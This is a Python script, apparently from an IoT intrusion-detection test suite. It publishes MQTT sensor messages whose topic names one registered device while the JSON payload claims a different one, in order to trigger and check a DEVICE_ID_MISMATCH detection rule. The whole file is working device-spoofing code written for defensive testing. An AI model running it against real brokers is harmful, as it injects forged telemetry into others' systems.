"""Device ID mismatch 공격 시나리오 진입점.

저장되는 detection event_type은 DEVICE_ID_MISMATCH를 사용해야 합니다.

탐지 기준:
  - topic의 device_id와 payload의 device_id가 서로 다른 경우
  - topic과 payload 양쪽 device_id가 모두 존재해야 함 (둘 다 등록 기기)
  - 미등록 device_id가 포함되면 UNKNOWN_DEVICE가 우선 적용됨

--topic-device-id / --payload-device-id로 결정적인 대상을 지정한다. 지정하지
않으면 REGISTERED_DEVICES 중 앞의 두 값을 기본으로 사용한다 (무작위 선택 금지).
동일 입력으로 반복 실행하면 항상 같은 기기가 검증 대상이 되어야 Manifest의
target_device_id와 실제 감점 대상이 어긋나지 않는다.

실행 예시:
  python -m attacks.device_id_mismatch_attack
  python -m attacks.device_id_mismatch_attack --host 192.168.0.10 --count 4 \
      --topic-device-id esp32_01 --payload-device-id esp32_02
"""

import argparse
import json
import random
import string
import time

import paho.mqtt.client as mqtt

from attacks.config import BROKER_HOST, BROKER_PORT, KEEPALIVE, REGISTERED_DEVICES, NORMAL_TOPIC_TPL


def _rand_str(length: int = 4) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _default_mismatch_pair() -> tuple[str, str]:
    """--topic-device-id / --payload-device-id가 지정되지 않았을 때 사용할
    결정적인 기본 (topic_device_id, payload_device_id) 쌍.

    REGISTERED_DEVICES의 앞 두 값을 고정 순서로 사용한다 (무작위 선택 금지 —
    반복 실행 시 항상 같은 기기가 검증 대상이 되어야 함).
    """
    if len(REGISTERED_DEVICES) < 2:
        raise ValueError(
            "REGISTERED_DEVICES에 최소 2개 기기가 필요합니다 "
            f"(현재: {REGISTERED_DEVICES!r}). --topic-device-id/--payload-device-id를 "
            "직접 지정하세요."
        )
    return REGISTERED_DEVICES[0], REGISTERED_DEVICES[1]


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="MQTT Device ID Mismatch Attack (DEVICE_ID_MISMATCH)")
    p.add_argument("--host",     default=BROKER_HOST)
    p.add_argument("--port",     default=BROKER_PORT, type=int)
    p.add_argument("--count",    default=4,           type=int,   help="보낼 메시지 수")
    p.add_argument("--interval", default=2.0,         type=float)
    p.add_argument(
        "--topic-device-id",
        default=None,
        help="Topic에 사용할 등록 기기 device_id (Manifest의 대상 Device와 일치해야 함)",
    )
    p.add_argument(
        "--payload-device-id",
        default=None,
        help="Payload에 위조할 등록 기기 device_id (topic-device-id와 달라야 함)",
    )
    return p.parse_args()


def main() -> None:
    args = parse_args()

    if args.topic_device_id or args.payload_device_id:
        if not (args.topic_device_id and args.payload_device_id):
            raise SystemExit(
                "--topic-device-id와 --payload-device-id는 함께 지정해야 합니다."
            )
        if args.topic_device_id == args.payload_device_id:
            raise SystemExit(
                "--topic-device-id와 --payload-device-id는 서로 달라야 합니다 "
                "(DEVICE_ID_MISMATCH 조건)."
            )
        for device_id, label in (
            (args.topic_device_id, "--topic-device-id"),
            (args.payload_device_id, "--payload-device-id"),
        ):
            if device_id not in REGISTERED_DEVICES:
                raise SystemExit(
                    f"{label}={device_id!r}는 등록 기기가 아닙니다 "
                    f"(REGISTERED_DEVICES={REGISTERED_DEVICES!r})."
                )
        topic_id, payload_id = args.topic_device_id, args.payload_device_id
    else:
        topic_id, payload_id = _default_mismatch_pair()

    client = mqtt.Client(client_id=f"attacker_mismatch_{_rand_str()}")
    client.connect(args.host, args.port, KEEPALIVE)
    client.loop_start()

    print(f"[DeviceIDMismatch] topic_device_id={topic_id!r} payload_device_id={payload_id!r} (고정)")
    print(f"  탐지 조건: 두 device_id가 모두 존재하지만 서로 다름")
    print()

    topic = NORMAL_TOPIC_TPL.format(device_id=topic_id)
    for i in range(args.count):
        payload = json.dumps({
            "device_id":   payload_id,
            "temperature": round(random.uniform(20.0, 30.0), 2),
            "humidity":    round(random.uniform(40.0, 70.0), 2),
        })
        result = client.publish(topic, payload, qos=0)
        print(f"  [{i+1}/{args.count}] topic={topic_id!r} payload.device_id={payload_id!r} (mid={result.mid})")
        time.sleep(args.interval)

    client.loop_stop()
    client.disconnect()
    print(f"\n[DeviceIDMismatch] 완료 — {args.count}개 불일치 메시지 발행 (topic={topic_id}, payload={payload_id})")


if __name__ == "__main__":
    main()
